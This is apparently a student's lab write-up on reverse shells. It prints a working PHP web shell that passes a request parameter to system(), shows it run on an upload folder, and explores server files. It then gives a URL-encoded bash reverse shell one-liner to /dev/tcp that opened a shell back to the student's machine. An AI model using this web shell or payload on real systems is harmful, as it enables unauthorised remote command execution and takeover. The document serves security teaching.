# Reverse Shell

## NAME: Bryan Yang

#### PART 1: Installing a PHP web shell
Webshell: 

    ```
    <pre>
    <?php
        if (isset($_REQUEST["command"])) {
            system($_REQUEST["command"]);
        } else {
            echo "No command requested.";
        }
    ?>
    </pre>
    ```
a). I can add arguments to the url, so for this case I can do using '?' like so: http://danger.jeffondich.com/uploadedimages/yangb2-webshell2.php?command=w 
 - **Result**:      03:56:21 up 353 days,  7:16,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 

b). For browsers, newlines in HTML are treated as spaces. The pre tag tells the browser to treat the following text as pre-formatted.  


#### PART 2: Looking Around
a). /var/www/

b). jeff, root, and ww-data. That's what I see when I do ls -la

c). List of services and the location of their passwords(?)

d). No. It is similar to passwd but has restricted access, usually only root can read.

e). 
 - /secrets/kindasecret.txt has an ascii frog. by Joan Stark.
 - /youwontfindthiswithgobuster/secret.txt has 2 ascii birds 

#### PART 4: Launching a Reverse Shell
a). I did the command 'ip addr' and looked the the eth0 inet address: **192.168.231.129**

b). I did ipaddr on wsl to get **192.168.248.52**

d). http://192.168.231.129/webshell.php?command=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.248.52/8000%200%3E%261%22

e). Yes, i have a shell now. When I do 'ip addr' the result says "192.168.231.129" which is the address of kali. 

f). 20 is space. 22 is quote. 3E is greater than. 26 is ampersand. 